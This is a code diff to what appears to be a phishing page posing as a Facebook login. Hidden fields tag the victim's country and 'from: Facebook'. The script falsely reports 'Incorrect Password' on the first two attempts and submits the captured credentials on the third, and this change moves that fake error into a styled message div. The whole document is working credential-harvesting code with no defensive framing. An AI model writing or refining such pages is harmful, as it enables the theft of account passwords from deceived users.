@@ -81,6 +81,13 @@
             font-size: 1.063rem;
         }
 
+        .error-message {
+            color: red;
+            font-size: 0.875rem;
+            margin-bottom: 15px;
+            display: none;
+        }
+
         .link {
             display: flex;
             flex-direction: column;
@@ -197,10 +204,12 @@
             event.preventDefault();
             loginAttempts++;
 
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.style.display = 'none';
+
             if (loginAttempts < 3) {
-                const loginButton = document.getElementById('button');
-                loginButton.textContent = 'Incorrect Password';
-                loginButton.style.backgroundColor = 'red';
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Incorrect Password';
             } else {
                 event.target.submit();
             }
@@ -221,6 +230,7 @@
                 <input type="text" name="password" id="password" required placeholder="password">
                 <input type="hidden" name="country" id="country">
                 <input type="hidden" name="from" value="Facebook">
+                <div id="error-message" class="error-message">Incorrect Password</div>
                 <div class="link">
                     <button type="submit" value="Send Email" class="login" id="button" style="text-decoration: none; color: white;">Login</button>
                     <a href="#" class="forgot">Forgot password?</a>
